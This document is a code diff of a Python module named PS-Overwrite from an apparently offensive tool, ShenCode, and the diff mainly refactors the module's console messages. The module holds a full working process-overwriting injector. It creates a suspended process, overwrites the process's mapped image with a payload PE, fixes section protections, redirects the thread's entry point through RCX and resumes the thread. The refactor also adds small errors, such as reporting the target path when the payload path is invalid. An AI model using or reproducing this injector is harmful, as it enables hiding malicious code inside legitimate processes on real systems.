@@ -1,17 +1,20 @@
 ########################################################
-### PSOverwrite Module
-### Status: migrated 085
+### ShenCode Module
 ###
+### Name: PS-Overwrite
+### Docs: https://heckhausen.it/shencode/README
+### 
 ########################################################
 
 import ctypes
-#import ctypes.wintypes
 from utils.style import *
 from utils.windef import *
 from utils.winconst import *
 
 CATEGORY    = 'inject'
 DESCRIPTION = 'Process_Overwrite Module, depends on https://github.com/hasherezade/process_overwriting'
+
+cs = ConsoleStyles()
 
 arglist = {
     'target':           { 'value': '', 'desc': 'Target process, to overwrite' },
@@ -24,7 +27,7 @@ def register_arguments(parser):
 
 class module:
         Author = 'psycore8'
-        Version = '0.2.4'
+        Version = '0.9.0'
         DisplayName = 'PROCESS-OVERWRITE'
         pid = 0
         attr_list = any
@@ -35,24 +38,7 @@ class module:
         def __init__(self, target, payload):
               self.target = target
               self.payload = payload
-        
-        def msg(self, message_type, MsgVar=None, ErrorExit=False):
-            messages = {
-                    'pre.head'         : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
-                    'create.cfg'       : f'{f_out} CFGuard mitigation will be applied!',
-                    'arg.error'        : f'{s_fail} Given argument is not valid: {MsgVar}',
-                    'prot_img'         : f'{s_note} Set memory to PAGE_READWRITE',
-                    'sec.try'          : f'{s_note} Set section protections',
-                    'error'            : f'{s_fail} Error: {ctypes.get_last_error()}',
-                    'mok'              : f'{s_ok} {MsgVar}',
-                    'mnote'            : f'{s_note} {MsgVar}',
-                    'merror'           : f'{s_fail} {MsgVar}',
-                    'post.done'        : f'{s_ok} DONE!'
-            }
-            print(messages.get(message_type, f'{message_type} - this message type is unknown'))
-            if ErrorExit:
-             exit()
-                
+                       
         def get_remote_base_address(self, hp):
 
             pbi = PROCESS_BASIC_INFORMATION()
@@ -70,21 +56,21 @@ class module:
                 kernel32.CloseHandle(hp)
                 return None
             return peb.ImageBaseAddress
-        
-        def translate_protect(self, sec_charact):
-            B = hex(sec_charact)[2:3]
-            if B == 'E': #EXECUTE_READ_WRITE
-                return PAGE_EXECUTE_READWRITE
-            if B == '6': # EXECUTE_READ
-                return PAGE_EXECUTE_READ
-            if B == '2': # EXECUTE
-                return PAGE_EXECUTE_READ
-            if B == 'C': # READ_WRITE
-                return PAGE_READWRITE
-            if B == '4': # READ
-                return PAGE_READONLY
 
-            return PAGE_READWRITE
+        def translate_protect(self, sec_charact):
+            memory_access = {
+                 'E': PAGE_EXECUTE_READWRITE,
+                 '6': PAGE_EXECUTE_READ,
+                 '2': PAGE_EXECUTE_READ,
+                 'C': PAGE_READWRITE,
+                 '4': PAGE_READONLY
+            }
+            B = hex(sec_charact)[2:3]
+            try:
+                 result = memory_access[B]
+                 return result
+            except KeyError:
+                 return PAGE_READWRITE
         
         def set_section_access(self, hProcess, base_address, pe_implant, image_size_target):
             op = USHORT(0)
@@ -98,29 +84,8 @@ class module:
                 if status != 0:
                      pass
                 else:
-                    print(f'VirtualProtectEx error: {ctypes.get_last_error()}')
-
-        # def create_nocfg_attributes(self, siex):
-        #     ctypes.memset(ctypes.byref(siex), 0, ctypes.sizeof(STARTUPINFOEX))
-            
-        #     cbAttributeListSize = ctypes.c_size_t(0)
-        #     MitgFlags = ctypes.c_ulonglong(PROCESS_CREATION_MITIGATION_POLICY_CONTROL_FLOW_GUARD_ALWAYS_OFF)
-            
-        #     kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(cbAttributeListSize))
-        #     if not cbAttributeListSize.value:
-        #         print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
-        #         return False
-            
-        #     buffer = ctypes.create_string_buffer(cbAttributeListSize.value)            
-        #     if not kernel32.InitializeProcThreadAttributeList(buffer, 1, 0, ctypes.byref(cbAttributeListSize)):
-        #         print(f"InitializeProcThreadAttributeList failed: {kernel32.GetLastError():#x}")
-        #         siex.lpAttributeList = None
-        #         return False
-            
-        #     if not kernel32.UpdateProcThreadAttribute(buffer, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, ctypes.byref(MitgFlags), ctypes.sizeof(MitgFlags), None, None):
-        #         print(f"UpdateProcThreadAttribute failed: {kernel32.GetLastError():#x}")
-        #         return False
-        #     return True, buffer
+                    cs.console_print.error(f'VirtualProtectEx error: {ctypes.get_last_error()}')
+                    return
         
         def free_nocfg_attributes(siex):
             if siex.lpAttributeList:
@@ -134,8 +99,7 @@ class module:
                  'target'   : { 'image_size': 0, 'image_base': 0 }
             }
 
-            m = self.msg
-            m('pre.head')
+            cs.module_header(self.DisplayName, self.Version)
             bytes_written = SIZE_T()
             context = CONTEXT()
             oldprotect = USHORT(0)
@@ -144,12 +108,12 @@ class module:
             target_exists = self.os.path.exists(self.target)
             payload_exists = self.os.path.exists(self.payload)
             if not target_exists:
-                 m('arg.error', self.target, True)
+                 cs.console_print.error(f'Given argument is not valid: {self.target}')
             if not payload_exists:
-                 m('arg.error', self.payload, True)
+                 cs.console_print.error(f'Given argument is not valid: {self.target}')
 
             process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE
-            m('create.cfg')
+            cs.console_print.note('CFGuard mitigation will be applied!')
             process_flags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT
             size = ctypes.c_size_t()
             kernel32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(size))
@@ -163,75 +127,61 @@ class module:
             siex.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
             siex.lpAttributeList = ctypes.cast(attr_list, ctypes.c_void_p)
 
-            m('mnote', 'Create suspended Process...')
+            cs.console_print.note('Create suspended Process...')
             success = CreateProcess(None, ctypes.c_wchar_p(self.target), None, None, False, process_flags, None, None, ctypes.byref(siex), ctypes.byref(pi))
             if not success:
-                m('error')
-                m('merror', 'CreateProcess failed', True)
+                cs.console_print.error(f'Error: {ctypes.get_last_error()}')
+                cs.console_print.error('CreateProcess failed')
+                return
 
-            m('mok', f'CreateProcess successful! PID: {pi.dwProcessId}')
+            cs.console_print.ok(f'CreateProcess successful! PID: {pi.dwProcessId}')
             kernel32.DeleteProcThreadAttributeList(attr_list)
 
             base_address = self.get_remote_base_address(pi.hProcess)
             if base_address:
-                 m('mnote', f'Base address found: {hex(base_address)}')
+                 cs.console_print.note(f'Base address found: {hex(base_address)}')
             else:
-                m('merror', 'Base address NOT found', True)
+                cs.console_print.error('Base address NOT found')
 
-            m('mnote', 'Processing target image') 
+            cs.console_print.note('Processing target image')
 
             pe_target = self.pefile.PE(self.target)
-            #target_image_size = pe_target.OPTIONAL_HEADER.SizeOfImage
-            #pe['target'] = pe_target.OPTIONAL_HEADER.SizeOfImage, pe_target.OPTIONAL_HEADER.ImageBase
             pe['target']['image_size'] = pe_target.OPTIONAL_HEADER.SizeOfImage
             pe['target']['image_base'] = pe_target.OPTIONAL_HEADER.ImageBase
-            #target_img_base = pe_target.OPTIONAL_HEADER.ImageBase
-            #target_info = f'image base: {hex(target_img_base)} - Size: {target_image_size}'
             target_info = f'image base: {hex(pe["target"]["image_base"])} - Size: {pe["target"]["image_size"]}'
-            m('mok', f'Target: {target_info}')
-
-            m('mnote', 'Processing payload image')
+            cs.console_print.note(f'Target: {target_info}')
+            cs.console_print.note('Processing payload image')
             pe_payl = self.pefile.PE(self.payload)
-            #payload_img_base = pe_payl.OPTIONAL_HEADER.ImageBase
-            #payload_image_size = pe_payl.OPTIONAL_HEADER.SizeOfImage
             pe['payload']['image_base'] = pe_payl.OPTIONAL_HEADER.ImageBase
             pe['payload']['image_size'] = pe_payl.OPTIONAL_HEADER.SizeOfImage
 
-            #payload_info = f'image base: {hex(payload_img_base)} - Size: {payload_image_size}'
             payload_info = f'image base: {hex(pe["payload"]["image_base"])} - Size: {pe["payload"]["image_size"]}'
-            m('mok', f'Payload: {payload_info}')
+            cs.console_print.ok(f'Payload: {payload_info}')
 
-            #if payload_image_size > target_image_size:
             if pe['payload']['image_size'] > pe['target']['image_size']:
-                 m('merror', 'The payload is too big to fit in target!', True)
+                 cs.console_print.error('The payload is too big to fit in target!')
 
-            m('mnote', 'Mapping memory image')
+            cs.console_print.note('Mapping memory image')
             pe_module = pe_payl.get_memory_mapped_image()
 
             ### fill payload PE image with 00
-            #padding_bytes = target_image_size - len(pe_module)
             padding_bytes = pe['target']['image_size'] - len(pe_module)
-            m('mnote', f'Padding image to target size, adding {padding_bytes} bytes')
-            #padding = (target_image_size - len(pe_module)) * b'\x00'
+            cs.console_print.note(f'Padding image to target size, adding {padding_bytes} bytes')
             padding = (pe['target']['image_size'] - len(pe_module)) * b'\x00'
             padded_payl = pe_module + padding
 
-            #status = VirtualProtectEx(pi.hProcess, base_address, target_image_size, PAGE_READWRITE, oldprotect)
             status = VirtualProtectEx(pi.hProcess, base_address, pe['target']['image_size'], PAGE_READWRITE, oldprotect)
 
-            m('mnote', 'Writing to process memory')
-            #if not WriteProcessMemory(pi.hProcess, base_address, padded_payl, target_image_size, ctypes.byref(bytes_written)):
+            cs.console_print.note('Writing to process memory')
             if not WriteProcessMemory(pi.hProcess, base_address, padded_payl, pe['target']['image_size'], ctypes.byref(bytes_written)):
                  raise Exception(f"WriteProcessMemory error: {ctypes.get_last_error()}")
 
-            m('mok', f'{bytes_written.value} bytes written to target process')
-            #self.set_section_access(pi.hProcess, base_address, pe_payl, target_image_size)
+            cs.console_print.ok(f'{bytes_written.value} bytes written to target process')
             self.set_section_access(pi.hProcess, base_address, pe_payl, pe['target']['image_size'])
             entry_point_rva = pe_payl.OPTIONAL_HEADER.AddressOfEntryPoint
             entry_point = base_address + entry_point_rva
-            m('mnote', f'Entry point is {hex(entry_point)}')
-
-            m('mnote', 'Redirecting code flow to new entry point')
+            cs.console_print.note(f'Entry point is {hex(entry_point)}')
+            cs.console_print.note('Redirecting code flow to new entry point')
             context.ContextFlags = 0x10007  # CONTEXT_FULL
             status = GetThreadContext(pi.hThread, ctypes.byref(context))
             if status == 0:
@@ -242,11 +192,11 @@ class module:
             if status == 0:
                  raise Exception(f"SetThreadCntext error: {ctypes.get_last_error()}")
             else:
-                 m('mok', f'RCX value changed to {hex(entry_point)}')
+                 cs.console_print.ok(f'RCX value changed to {hex(entry_point)}')
 
-            m('mok', f'ResumeThread PID: {pi.dwProcessId}')
+            cs.console_print.ok(f'ResumeThread PID: {pi.dwProcessId}')
             ResumeThread(pi.hThread)
 
             CloseHandle(pi.hThread)
             CloseHandle(pi.hProcess)
-            m('post.done')
+            cs.console_print.ok('DONE!')
